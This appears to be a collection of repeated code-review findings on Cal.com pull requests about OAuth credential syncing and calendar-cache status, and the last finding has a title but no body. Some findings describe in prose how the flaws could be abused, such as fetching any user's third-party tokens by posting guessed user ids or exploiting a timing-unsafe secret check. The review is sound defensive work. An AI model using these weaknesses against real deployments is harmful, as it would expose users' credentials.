title: Google credential key is overwritten with the zod SafeParse wrapper object instead of the token data
body: `parseRefreshTokenResponse()` returns the raw `safeParse` result (`{ success: true, data: {...} }`), not the parsed token. The Google refresh path does `const key = parseRefreshTokenResponse(googleCredentials, googleCredentialSchema)` and then `prisma.credential.update({ data: { key } })`, so the stored `credential.key` becomes `{ success: true, data: { access_token, ... } }`. The next time a `GoogleCalendarService` is constructed, `googleCredentialSchema.parse(credential.key)` throws because the required fields now live under `.data`, so Google Calendar stops working for every user after their first token refresh, regardless of whether credential sync is enabled. Previously `googleCredentialSchema.parse(googleCredentials)` returned the data directly. Use `.data` (as the Office365/Zoom/Salesforce callers do) or make the helper return the parsed data.

title: `prisma` is used but never imported in the Salesforce CalendarService
body: The new code in `getClient` calls `prisma.credential.update(...)` at line 96, but this file has no `import prisma from "@calcom/prisma"` (the import list only contains jsforce, rrule, zod, CalEventParser, constants, http-error, logger, types, getAppKeysFromSlug and parseRefreshTokenResponse). This fails type-check and, at runtime, throws `ReferenceError: prisma is not defined` on every Salesforce service instantiation, breaking the Salesforce integration completely.

title: Salesforce now refreshes the token on every service instantiation and then ignores the new access token
body: `getClient` is invoked from the constructor and now unconditionally POSTs to `https://login.salesforce.com/services/oauth2/token` with `grant_type=refresh_token` on every instantiation, with no expiry check. This adds a network round trip and a DB write to every booking/availability call and burns through Salesforce's refresh rate limits. Worse, after writing the refreshed token to the DB, the `jsforce.Connection` is still created with `credentialKey.access_token` / `credentialKey.instance_url` (the OLD values from `credential.key`), so the freshly obtained access token is never used. Also, unlike every other app in this PR, this path does not go through `refreshOAuthTokens`, so credential sync is silently not applied to Salesforce. Additionally `response.statusText !== "OK"` is unreliable (statusText is empty under HTTP/2); check `response.ok` instead.

title: Zoho Bigin passes `credentialId` where `refreshOAuthTokens` expects `userId`
body: `refreshOAuthTokens(fn, "zoho-bigin", credentialId)` passes the credential's primary key as the third argument, but the helper's signature is `(refreshFunction, appSlug, userId: number | null)` and it sends that value as `calcomUserId` to `CALCOM_CREDENTIAL_SYNC_ENDPOINT`. With credential sync enabled, the self-hoster's endpoint will be asked for the tokens of whatever user happens to have `id === credentialId`, and those tokens are then written into this credential and used for API calls — a cross-user credential leak. `refreshAccessToken` only receives `credentialId` and `credentialKey`; it needs `credential.userId` threaded through (as every other app does).

title: `minimumTokenResponseSchema` uses bogus computed keys and strips every field except `access_token`
body: `[z.string().toString()]: z.number()` and `[z.string().optional().toString()]: z.unknown().optional()` do not create pattern/catch-all keys; `ZodType.toString()` returns `"[object Object]"`, so both lines define the same literal property `"[object Object]"` (the second overrides the first). The resulting schema is effectively `z.object({ access_token: z.string() })`, and since `z.object` strips unknown keys by default, when `APP_CREDENTIAL_SHARING_ENABLED && CALCOM_CREDENTIAL_SYNC_ENDPOINT` is set the returned `data` contains only `access_token`. Consequences: Office365 loses `expires_in`/`expiry` (so `isExpired` sees undefined and refreshes on every call), Zoom computes `expiry_date = Date.now() + undefined * 1000 = NaN` (serialized to `null` in JSON, after which `zoomTokenSchema.parse` fails forever with "Zoom credential keys parsing error"), and Salesforce loses `instance_url`. The comment "Assume that any property with a number is the expiry" is not implemented. Use `.passthrough()` or `z.record()`/`.catchall()` and validate the expiry explicitly.

title: Injecting the literal string "refresh_token" clobbers real refresh tokens in the DB
body: When the parsed response lacks `refresh_token`, the helper sets `data.refresh_token = "refresh_token"` (a placeholder string). Callers then persist this: Zoom does `key.refresh_token = newTokens.refresh_token` and Office365 does `{ ...o365AuthCredentials, ...tokenResponse.data }`, so the user's genuine refresh token in `credential.key` is overwritten with the literal `"refresh_token"`. This happens in sync mode for Zoom (the minimum schema never includes refresh_token) and in normal mode for Office365 whenever Microsoft omits `refresh_token` from a refresh response (the schema marks it optional). Previously zod omitted absent optional keys so the spread preserved the stored value. Once clobbered, disabling sync (or the next normal refresh) fails permanently with invalid_grant and the user must reconnect the app. Don't mutate the parsed data; leave the field absent and let callers keep the existing stored refresh token.

title: Sync branch returns a raw fetch `Response` but several callers expect an axios response or an already-parsed token object
body: In the sync branch `refreshOAuthTokens` returns the `fetch` `Response` object, whereas the per-app `refreshFunction`s return heterogeneous shapes that the callers depend on: Google returns a gaxios response and reads `res.data.access_token`; HubSpot returns a parsed `HubspotToken` and reads `.accessToken`/`.expiresIn`; Zoho CRM and Zoho Bigin return an axios response and read `.data.error`/`.data.access_token`. With sync enabled, Google hits `token.access_token` on `undefined` (TypeError, swallowed by the catch and the expired token is reused), Zoho CRM/Bigin throw `Cannot read properties of undefined (reading 'error')`, and HubSpot stores a mangled object with `expiryDate: NaN` and `accessToken: undefined`. Only the apps whose refresh functions already return a `fetch` `Response` (Lark, Office365, Webex, Zoom, MS Teams) work. The helper must normalize the sync response (e.g. `await response.json()`) into the shape each caller expects, or callers must branch on sync mode.

title: Request to CALCOM_CREDENTIAL_SYNC_ENDPOINT carries no authentication
body: The sync request POSTs only `calcomUserId` and `appSlug` as form fields with no shared secret, signature or bearer header. The self-hoster's endpoint therefore has no way to verify the request came from Cal.com, and anyone who can reach that endpoint can obtain any user's third-party access tokens simply by posting a user id. The inbound webhook (`app-credential.ts`) uses `CALCOM_WEBHOOK_SECRET`; the outbound request should at minimum send that secret in `CALCOM_WEBHOOK_HEADER_NAME` so the endpoint can authenticate the caller. The comment "Customize the payload based on what your endpoint requires" also implies self-hosters are expected to edit source, which is not a viable contract. Note also the `appSlug` values are inconsistent: Zoom passes `"zoomvideo"` (directory name) while its DB slug is `"zoom"`, and MS Teams passes `"msteams"` (slug).

title: `appStoreMetadata` is keyed by app directory name, not by App.slug, so most apps return 404
body: The handler looks up the app by `prisma.app.findUnique({ where: { slug } })` and then indexes `appStoreMetadata[app.slug]`. `appStoreMetadata` (from `@calcom/app-store/appStoreMetaData`, built from `apps.metadata.generated.ts`) is keyed by directory name — `googlecalendar`, `zoomvideo`, `office365calendar`, `larkcalendar`, `office365video` — while the DB slugs are `google-calendar`, `zoom`, `office365-calendar`, `lark-calendar`, `msteams`. For all of those the lookup yields `undefined` and the webhook responds `404 "App not found. Ensure that you have the correct app slug"`, so the headline feature cannot sync credentials for the main calendar/video apps. Only apps whose dirName equals their slug (hubspot, salesforce, zohocrm, webex, zoho-bigin) happen to work. Look the metadata up by matching `.slug` (e.g. `Object.values(appStoreMetadata).find(m => m.slug === app.slug)`) or use the `type`/`dirName` stored on the App row.

title: Webhook secret compared with `!==` and endpoint accepts any HTTP method
body: The shared secret is compared with a plain string `!==`, which is not constant-time; use `crypto.timingSafeEqual` on equal-length buffers. The handler also does not restrict `req.method` to POST, and `req.headers[...]` may be a `string[]` if the header is repeated. Additionally, if `CALCOM_WEBHOOK_SECRET` were ever unset the `APP_CREDENTIAL_SHARING_ENABLED` check happens to protect it, but the comparison itself would otherwise be `undefined !== undefined === false` and allow unauthenticated writes — worth an explicit guard.

title: Schema `.parse`, `symmetricDecrypt` and `JSON.parse` failures surface as unhandled 500s
body: `appCredentialWebhookRequestBodySchema.parse(req.body)` throws a `ZodError` on invalid input, and `symmetricDecrypt(...)` / `JSON.parse(...)` throw on a bad key or malformed ciphertext. None of these are caught and the handler is not wrapped in `defaultResponder`, so callers get a generic 500 with a stack trace instead of a 400 with a useful message, and the server logs noise for every malformed webhook. Use `safeParse` and a try/catch around decryption, returning 400.

title: No tests for the new webhook endpoint or the shared OAuth helpers
body: The PR adds a new authenticated API route that writes third-party credentials into the database, plus two helpers (`refreshOAuthTokens`, `parseRefreshTokenResponse`) that are now on the token-refresh path of 10+ integrations, with zero automated tests (the author's checklist confirms this). Several of the defects in this PR — the Google key being stored as a SafeParse wrapper, the broken computed-key zod schema, the missing `prisma` import in Salesforce, the dirName-vs-slug metadata lookup — would have been caught by even a minimal unit test of each helper and a request-level test of the webhook. At minimum add tests for: secret validation, 404 paths, create-vs-update, and `parseRefreshTokenResponse` output in both sync and non-sync modes.

title: Google credential key is overwritten with the Zod SafeParse wrapper object instead of the token data
body: `parseRefreshTokenResponse` returns the Zod `safeParse` result (`{ success: true, data: {...} }`), not the parsed credentials. In the Google refresh path the whole result is assigned to `key` and then persisted via `prisma.credential.update({ data: { key } })`. After the first token refresh, the stored credential key becomes `{success: true, data: {access_token,...}}`, and the next instantiation of `GoogleCalendarService` fails at `googleCredentialSchema.parse(credential.key)` (no top-level `access_token`/`refresh_token`), breaking Google Calendar for that user until they reconnect. Previously the code stored `googleCredentialSchema.parse(googleCredentials)` directly. Use `.data` (or return the data from the helper).

title: `prisma` is used but never imported in Salesforce CalendarService
body: The new refresh block in `getClient` calls `await prisma.credential.update(...)`, but this file has no `import prisma from "@calcom/prisma"` (imports are only jsforce, rrule, zod, lib helpers and types). This is a type-check error and, if it slipped through, a `ReferenceError: prisma is not defined` at runtime on every Salesforce service instantiation, making the Salesforce integration unusable.

title: Helper injects a literal `refresh_token: "refresh_token"` that can overwrite the real refresh token in the DB
body: When the parsed token response lacks `refresh_token`, the helper unconditionally sets `refreshTokenResponse.data.refresh_token = "refresh_token"`. This runs in the normal (non-sync) path too. In `office365calendar/lib/CalendarService.ts` the schema declares `refresh_token` as optional and the result is spread over the stored credentials (`{ ...o365AuthCredentials, ...tokenResponse.data }`) and persisted. If Microsoft omits `refresh_token` from a refresh response, the user's real refresh token is replaced with the string "refresh_token" in the database, and every subsequent refresh fails permanently (user must reconnect). Before this PR an absent key simply left the existing refresh token intact. The placeholder should not be written when a real value exists / the field is absent.

title: `minimumTokenResponseSchema` uses computed keys that evaluate to "[object Object]", so it strips every field except access_token
body: `[z.string().toString()]` and `[z.string().optional().toString()]` are computed property keys that both evaluate to the string "[object Object]" (the second overriding the first). The resulting schema is effectively `z.object({ access_token: z.string(), "[object Object]": z.unknown().optional() })`. Zod objects strip unknown keys by default, so in credential-sync mode `data` contains only `access_token`: `expires_in`/`expiry_date`, `instance_url`, `scope`, etc. are all dropped. Consequences: Zoom computes `key.expiry_date = Math.round(Date.now() + undefined * 1000)` = NaN (serialized as null, failing `zoomTokenSchema` on the next call); Office365 loses `expires_in` so the token is treated as expired on every request; Salesforce loses `instance_url` so the next `jsforce.Connection` has no instance URL. The intent ("allow other properties") requires `.passthrough()` or `z.record`, not computed keys.

title: Sync path returns a raw fetch `Response`, but several callers expect SDK-shaped results (hubspot token object, gaxios/axios `.data`)
body: When `CALCOM_CREDENTIAL_SYNC_ENDPOINT` is set, `refreshOAuthTokens` returns the raw `fetch` `Response` regardless of what the wrapped `refreshFunction` would have returned. Callers were written against the original SDK shapes: `hubspot/lib/CalendarService.ts` treats the result as a `HubspotToken` (`.expiresIn`, `.accessToken`) and persists it—storing a `Response` object (serialized as `{}`) as the credential key and calling `setAccessToken(undefined)`; `googlecalendar/lib/CalendarService.ts` reads `res.data.access_token` (a `Response` has no `.data`, so this throws a TypeError); `zoho-bigin` and `zohocrm` read `tokenInfo.data.error` from what they expect to be an axios response, which throws. `larkcalendar` passes it to `handleLarkError` expecting Lark's `{code, data}` envelope. The comment says the endpoint response "should only contain the access token and expiry date", but each adapter needs a different shape, so no single self-hosted endpoint can satisfy them. The helper needs per-adapter normalization (e.g. return parsed JSON and let adapters map it) rather than a shared raw Response.

title: Request to the self-hoster's credential sync endpoint carries no authentication
body: The POST to `CALCOM_CREDENTIAL_SYNC_ENDPOINT` sends only `calcomUserId` and `appSlug` in the body with no secret/signature header (e.g. `CALCOM_WEBHOOK_SECRET` under `CALCOM_WEBHOOK_HEADER_NAME`, which the inbound webhook already requires). The endpoint returns live OAuth access tokens for arbitrary user ids, so the self-hoster is forced to either leave it unauthenticated (anyone who can reach it can obtain any user's third-party tokens by guessing numeric ids) or rely on network-level controls. The outgoing request should include the shared secret so the endpoint can verify the caller.

title: zoho-bigin passes `credentialId` where `refreshOAuthTokens` expects the user id
body: `refreshOAuthTokens(fn, "zoho-bigin", credentialId)` passes the credential's id as the third argument, which the helper documents and uses as `userId` (sent as `calcomUserId` to the sync endpoint). In sync mode the self-hoster's endpoint would receive a credential id masquerading as a user id and return tokens for the wrong user (or none). Every other adapter passes `credential.userId`; this one should too (and `refreshAccessToken` needs access to the credential's userId, which it currently doesn't receive).

title: Zoom sends app slug "zoomvideo" to the sync endpoint, but the app's slug is "zoom"
body: The inbound webhook (`apps/web/pages/api/webhook/app-credential.ts`) looks apps up by their store slug, and Zoom's slug is `zoom` (see `zoomvideo/api/callback.ts` creating the credential with `appId: "zoom"`). The refresh path, however, calls `refreshOAuthTokens(..., "zoomvideo", ...)`. A self-hoster keying their endpoint by the same slugs they use for the webhook will not recognize `zoomvideo`, so Zoom token refresh via sync fails. Use the canonical slug `zoom` to match the rest of the system.

title: Webhook upserts by (userId, appId) and will silently overwrite an arbitrary credential when a user has several for the same app
body: Cal.com allows multiple credentials per user for the same app (e.g. several Google Calendar accounts, each a separate `Credential` row with `appId: "google-calendar"`). The handler does `findFirst({ where: { userId, appId } })` with no ordering and overwrites whichever row is returned, so a sync for one connected account can clobber the keys of a different one, breaking that calendar connection. It also never considers team-owned credentials. The payload should identify the target credential (e.g. a credential id or an external account identifier), or the handler should refuse/branch when more than one match exists.

title: Webhook secret compared with `!==` and no HTTP method/body-shape error handling
body: The shared secret header is compared with plain `!==`, which is not constant-time and leaks timing information about the secret; use `crypto.timingSafeEqual` on equal-length buffers. The handler also accepts any HTTP method (a GET with a header would try to `parse(req.body)` and throw) and lets `appCredentialWebhookRequestBodySchema.parse`, `symmetricDecrypt`, and `JSON.parse` throw unhandled, producing 500s with stack details instead of a 400. Restrict to POST and wrap validation/decryption in proper error responses.

title: Salesforce now refreshes the token and writes the DB on every service instantiation, and still connects with the old access token
body: `getClient` unconditionally POSTs to `login.salesforce.com/services/oauth2/token` and performs a `prisma.credential.update` every time `SalesforceCalendarService` is constructed (which happens for every booking/availability flow), regardless of whether the stored token is still valid—previously jsforce refreshed lazily. This adds a network round-trip and a DB write per instantiation and will hit Salesforce token-endpoint rate limits. Moreover, the `jsforce.Connection` is still built with `credentialKey.access_token` / `credentialKey.instance_url` (the pre-refresh values) rather than `accessTokenParsed.data`, so the freshly obtained token isn't even used. Also `response.statusText !== "OK"` is fragile (HTTP/2 responses have an empty statusText); check `response.ok`.

title: Helper throws on invalid response, making callers' `!success` branches dead and changing Office365 error behavior
body: `parseRefreshTokenResponse` throws `"Invalid refreshed tokens were returned"` when validation fails, so the `if (!parsedToken.success)` checks in `zoomvideo/lib/VideoApiAdapter.ts` and `salesforce/lib/CalendarService.ts` can never execute. For Office365 this silently changes behavior: the previous code logged the Zod error together with Microsoft's raw response and continued; now the diagnostic logging was deleted and the refresh throws, leaving operators with no information about why Microsoft's response was rejected. Either return the failed result and let callers handle it, or keep the diagnostic logging in the helper.

title: No tests for the new webhook or the shared refresh helpers
body: The PR adds a new authenticated API endpoint that writes third-party credentials to the DB and two helpers (`refreshOAuthTokens`, `parseRefreshTokenResponse`) that are now on the token-refresh path of ten integrations, yet ships no unit or integration tests (the PR checklist explicitly says none were added). Several of the defects above (SafeParse wrapper stored as key, broken computed-key schema, Response vs SDK shape mismatch, missing prisma import) would have been caught by even a basic test of each helper's output shape and of one adapter's refresh flow in both sync and non-sync modes.

title: Google credential is overwritten with a zod SafeParse wrapper object, corrupting every refreshed credential
body: `parseRefreshTokenResponse` returns the raw zod `safeParse` result (`{ success: true, data: {...} }`), not the parsed data. The Google refresh path does `const key = parseRefreshTokenResponse(googleCredentials, googleCredentialSchema)` and then `prisma.credential.update({ data: { key } })`, so the stored credential key becomes `{success: true, data: {access_token, refresh_token, ...}}` instead of the token object. Previously this was `googleCredentialSchema.parse(googleCredentials)` which returned the data directly. On the next instantiation `googleCredentialSchema.parse(credential.key)` in `googleAuth` throws, so Google Calendar stops working for every user whose token has been refreshed once — and this happens regardless of whether credential sync is enabled. Use `.data` (or make the helper return the data).

title: minimumTokenResponseSchema uses nonsensical computed keys and strips everything except access_token
body: `[z.string().toString()]` and `[z.string().optional().toString()]` both evaluate to the string `"[object Object]"` (Zod schemas don't override `toString`), so the object literal collapses to `{ access_token: z.string(), "[object Object]": z.unknown().optional() }`. The comments say it should accept a numeric expiry and pass through other properties, but zod's `z.object` strips unknown keys by default, so when credential sync is enabled the parsed `data` contains only `access_token`. Consequences in sync mode: Zoom computes `key.expiry_date = Date.now() + undefined * 1000` → `NaN`, which then fails `zoomTokenSchema.parse` on the next call ("Zoom credential keys parsing error"); Office365 never gets a new `expires_in` so the token is treated as expired and refreshed on every request; Google loses `expiry_date`. Use `.passthrough()` / `.catchall()` or an explicit expiry field instead.

title: Placeholder refresh_token is injected even when sync is disabled, overwriting the real Office365 refresh token
body: After parsing, the helper unconditionally sets `refreshTokenResponse.data.refresh_token = "refresh_token"` whenever the response lacks one — including the normal (non-sync) path. Office365's `refreshTokenResponseSchema` declares `refresh_token` as optional; previously a missing key was simply absent and the spread `{ ...o365AuthCredentials, ...tokenResponse.data }` kept the stored refresh token. Now, if Microsoft omits `refresh_token` in a refresh response, the stored credential's real refresh token is replaced with the literal string `"refresh_token"` and persisted to the DB (office365calendar/lib/CalendarService.ts line 264–272), permanently breaking that calendar connection until the user reconnects. The placeholder should only be applied in the sync branch.

title: Sync path returns a raw fetch Response regardless of the shape each caller expects
body: When `CALCOM_CREDENTIAL_SYNC_ENDPOINT` is set, `refreshOAuthTokens` returns the `fetch` `Response` object, but the callers were written around their original client's return type: Google reads `res?.data` (Gaxios response) → `undefined.access_token` TypeError; HubSpot treats the return value directly as a `HubspotToken`, so `expiresIn` is undefined (`expiryDate` becomes `NaN`) and a `Response` object is written to `credential.key`; Zoho CRM and Zoho Bigin read `tokenInfo.data` (axios) → `undefined.error` TypeError. Only the callers that already consumed a `fetch` Response (Office365, Lark, Webex, Zoom, MS Teams) can work. The helper needs to normalize the sync response to the caller's expected shape (e.g. return parsed JSON and adapt each caller), otherwise the headline feature is broken for 4 of the 9 integrated apps.

title: Credential sync request carries no authentication, exposing the self-hoster's token endpoint
body: The POST to `CALCOM_CREDENTIAL_SYNC_ENDPOINT` sends only `calcomUserId` and `appSlug` with no secret header or signature, and the `response.ok` status is never checked. As shipped, any party who can reach the self-hoster's endpoint can request fresh third-party access tokens for any user id simply by guessing integer ids. The inbound webhook requires `CALCOM_WEBHOOK_SECRET`; the outbound call should at minimum send the same shared secret (e.g. in `CALCOM_WEBHOOK_HEADER_NAME`) so the partner endpoint can authenticate Cal.com, and non-2xx responses should be surfaced as errors rather than passed to token parsing.

title: `prisma` is used but never imported in Salesforce CalendarService
body: The new refresh block calls `await prisma.credential.update(...)` but the file has no `import prisma from "@calcom/prisma"` (imports are jsforce, rrule, zod, CalEventParser, constants, http-error, logger, types, getAppKeysFromSlug and parseRefreshTokenResponse). This fails type-check and at runtime throws `ReferenceError: prisma is not defined` inside `getClient`, which rejects `this.conn` and makes every Salesforce operation fail.

title: Salesforce now refreshes on every instantiation, bypasses the sync helper, and builds the connection with the stale token
body: `getClient` unconditionally calls Salesforce's token endpoint each time the service is constructed (no expiry check), even though jsforce was already configured with `refreshToken` and refreshes automatically. It also calls `fetch` directly instead of `refreshOAuthTokens`, so the credential-sync feature this PR introduces does not apply to Salesforce at all, and `parseRefreshTokenResponse` is only used for validation. After the refresh, the `jsforce.Connection` is still created with `credentialKey.access_token` (the old token) rather than `accessTokenParsed.data.access_token`, so the newly obtained token is written to the DB but never used for the request. Additionally `response.statusText !== "OK"` is a brittle success check (statusText can be empty), and the `if (!accessTokenParsed.success)` branch is unreachable because the helper throws on failure.

title: Zoho Bigin passes credentialId where refreshOAuthTokens expects userId
body: `refreshOAuthTokens(fn, "zoho-bigin", credentialId)` passes the credential's id as the third argument, whose contract is `userId: number | null` and which is sent to the partner endpoint as `calcomUserId`. In sync mode the self-hoster will look up (and return tokens for) the wrong user — potentially another user's Zoho Bigin credentials — and the team-credential guard (`userId` null) is defeated because a credential id is always truthy. `refreshAccessToken` receives `credentialKey`/`credentialId` only; the credential's `userId` needs to be threaded through.

title: Zoom sync request uses directory name "zoomvideo" instead of app slug "zoom"
body: The inbound webhook (`app-credential.ts`) resolves apps by slug and Zoom's slug/appId is `"zoom"` (see `zoomvideo/api/callback.ts`). The outbound sync request sends `appSlug: "zoomvideo"`, so a partner that keys its implementation on the same slug it pushes credentials with will not recognize Zoom refresh requests. Every other call site uses the real slug (`google-calendar`, `office365-calendar`, `msteams`, ...).

title: Webhook secret compared with non-constant-time `!==` and no HTTP method restriction
body: The secret check uses plain string inequality, which leaks timing information about how many leading bytes match; use `crypto.timingSafeEqual` on equal-length buffers as other webhook handlers do. The handler also accepts any HTTP method (GET, DELETE...) and proceeds to write credentials, where it should reject anything but POST with 405.

title: Body validation, decryption and JSON.parse failures are unhandled and surface as 500s
body: `appCredentialWebhookRequestBodySchema.parse(req.body)` throws a ZodError on malformed input, `symmetricDecrypt` throws on a wrong key/ciphertext, and `JSON.parse` throws on non-JSON plaintext. None are caught, so a partner sending a bad payload gets a generic Next.js 500 (and a stack trace in dev) instead of a 400 explaining the problem, making integration debugging harder. Wrap these in try/catch (or use `safeParse`) and return 400 with a message.

title: No tests for the new shared OAuth helpers or webhook despite touching every OAuth refresh path
body: The PR rewires the token-refresh path for Google, Office365, MS Teams, HubSpot, Lark, Webex, Zoom, Zoho CRM, Zoho Bigin and Salesforce through two new helpers and adds an unauthenticated-by-design webhook that writes credentials, yet adds no unit tests (the description acknowledges tests were not added). Even a small test of `parseRefreshTokenResponse` would have caught that it returns a SafeParse wrapper, that the computed-key schema strips fields, and that the `refresh_token` placeholder leaks into the non-sync path; a test of `refreshOAuthTokens` with the sync env set would have caught the Response-shape mismatch for Google/HubSpot/Zoho.

title: deleteCache mutation never invalidates connectedCalendars, so stale cache status stays on screen
body: The `deleteCache` mutation only shows a toast and calls the optional `onSuccess` prop; unlike the `disconnectMutation` right below it, it does not call `utils.viewer.calendars.connectedCalendars.invalidate()`. `onSuccess`/`onChanged` is optional and is not guaranteed to refetch (several callers of `SelectedCalendarsSettingsWebWrapper` don't pass it). After a successful deletion the dropdown continues to show 'Cache Status / Last updated: …' and a 'Delete cached data' item for cache rows that no longer exist, until the query happens to refetch. Add an `onSettled` that invalidates `viewer.calendars.connectedCalendars` as is done for the disconnect mutation.

title: Access-denied/not-found case throws a plain Error, surfaced as HTTP 500
body: When the credential does not exist or belongs to another user the handler throws `new Error("Credential not found or access denied")`. tRPC maps non-`TRPCError` exceptions to `INTERNAL_SERVER_ERROR` (500) and logs them as server faults, so a user-caused condition (wrong/foreign credentialId) is reported as an outage and the client cannot distinguish it from a real failure. Throw `new TRPCError({ code: "NOT_FOUND" })` (or `FORBIDDEN`) instead, consistent with the other handlers in this router.

title: Cache status ignores expiresAt, so expired cache rows are reported as live cache
body: `getCacheStatusByCredentialIds` groups all `CalendarCache` rows by credentialId with no `expiresAt >= now()` filter, while `getCachedAvailability` only ever serves rows with `expiresAt >= now()`. Expired rows that have not been cleaned up will therefore make the UI show 'Cache Status / Last updated …' and offer deletion for cache that is never used for availability. Filter on `expiresAt: { gte: new Date() }` so the displayed status matches what is actually served.

title: Backfilling updatedAt with NOW() makes every legacy cache row look freshly refreshed
body: The migration sets `updatedAt = NOW()` for all existing `CalendarCache` rows. Since this column is now surfaced to users as 'Last updated: {{timestamp}}', every pre-existing (possibly weeks-old) cache entry will display the migration time as its last refresh, which is misleading for the very purpose of this feature (diagnosing stale cache). A better backfill is derivable from existing data: rows are always written with `expiresAt = now + 30 days` (`CACHING_TIME`), so `UPDATE "CalendarCache" SET "updatedAt" = "expiresAt" - INTERVAL '30 days'` after adding the column gives an accurate value. Also, the header comment ('without a default value. This is not possible if the table is not empty') is stale since a default was added.

title: Extra SelectedCalendar.updateMany write on every cache refresh for data nothing reads
body: `fetchAvailabilityAndSetCache` now issues `SelectedCalendarRepository.updateManyByCredentialId(this.credential.id, {})` to bump `SelectedCalendar.updatedAt` for every row under the credential. This runs on every Google webhook notification and cron refresh, adding a write touching N rows per credential, yet `SelectedCalendar.updatedAt` is not consumed anywhere (the UI uses `CalendarCache.updatedAt`, and the PR description itself questions whether this should be kept). It also overwrites `updatedAt` semantics for SelectedCalendar (which previously tracked configuration changes) with 'cache refreshed'. Remove it, or make it serve a concrete purpose.

title: UserWithCalendars now requires updatedAt and googleChannelId that nothing in this module uses
body: `UserWithCalendars.allSelectedCalendars`/`userLevelSelectedCalendars` now require `updatedAt` and `googleChannelId` on every selected calendar, but no code in `getConnectedDestinationCalendars.ts` (or the handler consuming it) reads these fields. This type is exported and re-exported through `@calcom/platform-libraries` (`getConnectedDestinationCalendars`), so any external caller that builds the user from a narrower `select` (e.g. only `externalId/integration/eventTypeId`) now fails type-checking for no functional benefit. The only reason the trpc path compiles is the matching change in `user.ts` `findUnlockedUserForSession`. Revert the type widening (and the extra `select` fields) unless the fields are actually used.

title: ENV_FILE is resolved relative to the caller's CWD, writing GOOGLE_WEBHOOK_URL to the wrong .env
body: `ENV_FILE="../.env"` is relative to the working directory, not to the script's location. The script lives in `scripts/`, so running it the usual way from the repo root (`./scripts/test-gcal-webhooks.sh` or `bash scripts/...`) resolves to the directory *above* the repository, where the script will create a stray `.env` and report success while the real `.env` is untouched. Resolve the path relative to the script, e.g. `ENV_FILE="$(dirname "$0")/../.env"`.

title: sed -i '' is BSD/macOS-only and fails on GNU sed
body: `sed -i '' -E ...` is the macOS/BSD form; GNU sed treats `''` as the sed script and `-E` and the real expression as filenames, failing with 'can't read ...'. Contributors on Linux will get an error instead of an updated `GOOGLE_WEBHOOK_URL`. Use a portable approach (e.g. write to a temp file and `mv`, or detect the platform). Also note `cleanup` always `exit 0`, so the rate-limit and 'Failed to extract URL' failure paths return success.

title: dev:cron switched to `npx tsx` but tsx is not a declared dependency
body: The `dev:cron` script now runs `npx tsx cron-tester.ts`, yet `tsx` is not listed in `dependencies`/`devDependencies` (only `ts-node` is). `npx` will attempt to download an unpinned latest `tsx` at run time (prompting interactively, and failing offline or under `npm_config_yes=false`), which makes the script non-reproducible. Either add `tsx` as a devDependency and call it via `yarn tsx`/`tsx`, or keep `ts-node`. This change is also unrelated to the calendar-cache feature.

title: Cache timestamp is formatted with a hard-coded en-US locale
body: `new Intl.DateTimeFormat("en-US", …)` ignores the user's locale and time format even though the surrounding string is translated via `useLocale`. Non-US users will see `7/15/25, 4:06 PM` style output regardless of their language/12h-24h preference. Use the locale from `useLocale()` (e.g. `i18n.language`) or the existing dayjs/`formatTime` helpers that respect the user's `timeFormat`.

title: Cache status query bypasses the calendar-cache feature flag and runs unconditionally
body: The handler instantiates `CalendarCacheRepository` directly instead of going through `CalendarCache.init()`/`CalendarCache.initFromCredentialId`, which returns the mock repository when the `calendar-cache` feature is disabled. As a result every `connectedCalendars` call (a hot query on the installed-apps page, event-type settings and onboarding) now performs an extra `groupBy` on `CalendarCache` even for deployments/teams with caching disabled, where the result is always empty. Route through the feature-flag-aware factory, or at least skip the query when `credentialIds` is empty.

title: No tests for new deleteCache endpoint or dropdown, and the replaced disconnect control has no test id
body: The PR adds a new authenticated tRPC mutation (`deleteCache`) with an ownership check, a new repository method, and replaces the `DisconnectIntegration` trash button with a dropdown on the connected-calendars list, but adds no unit or e2e tests. The ownership check in `deleteCacheHandler` (must not delete another user's cache) is exactly the kind of authorization logic that should have a test, and the new trigger `Button` has no `data-testid`, so existing Playwright flows that disconnect a calendar from this list can no longer target the control reliably. Add a handler test for the foreign-credential case and a test id on the dropdown trigger/items.

title: deleteCache mutation never invalidates connectedCalendars query, leaving stale cache status in the UI
body: The `deleteCacheMutation` only shows a toast and calls the optional `onSuccess` prop. Unlike `disconnectMutation` (which invalidates `viewer.calendars.connectedCalendars` in `onSettled`), nothing refetches the connected calendars query after the cache rows are deleted. `cacheUpdatedAt` comes from that query, so after a successful deletion the dropdown continues to show "Cache Status / Last updated: ..." and the "Delete cached data" item until the page is reloaded. In `SelectedCalendarsSettingsWebWrapper` `onChanged` is an optional prop that is frequently undefined, so the fallback does not help. Add `utils.viewer.calendars.connectedCalendars.invalidate()` in `onSettled`/`onSuccess` of the delete-cache mutation.

title: getCacheStatusByCredentialIds reports expired cache rows as live cache status
body: The `groupBy` has no `expiresAt: { gte: now }` filter, whereas every read path (`getCachedAvailability`) only serves rows whose `expiresAt` is in the future. A credential whose cache entries have all expired (e.g. the Google watch channel lapsed a month ago) will still be shown in the UI as having a cache with a "Last updated" timestamp and a "Delete cached data" action, even though no cache is actually being served. This defeats the purpose of a cache status indicator. Filter on `expiresAt >= new Date()` (or return both values so the UI can show expired state).

title: Access-denied/not-found case throws a plain Error, surfacing as a 500 INTERNAL_SERVER_ERROR
body: When the credential does not belong to the caller (or does not exist) the handler throws `new Error("Credential not found or access denied")`. tRPC maps non-`TRPCError` exceptions to `INTERNAL_SERVER_ERROR`, so a legitimate authorization failure is reported to the client as a server error (and will be logged/alerted as one). Use `new TRPCError({ code: "NOT_FOUND" })` or `"FORBIDDEN"` as the rest of the viewer routers do.

title: Extra bulk UPDATE on every webhook refresh writes a field nothing reads
body: `fetchAvailabilityAndSetCache` is invoked from the Google webhook handler on every push notification. The new `SelectedCalendarRepository.updateManyByCredentialId(this.credential.id, {})` issues an `UPDATE SelectedCalendar ... WHERE credentialId = ?` solely to bump `@updatedAt` across all selected calendars for that credential (including event-type-level rows). The PR description itself notes the frontend does not consume `SelectedCalendar.updatedAt` and uses `CalendarCache.updatedAt` instead. This is a redundant write amplifying webhook load with no consumer, and an empty `data: {}` relies on Prisma's implicit `@updatedAt` behaviour for `updateMany`, which is non-obvious to future readers. Remove it (or document the consumer if one is intended).

title: `sed -i ''` is BSD/macOS-only syntax; script fails on Linux
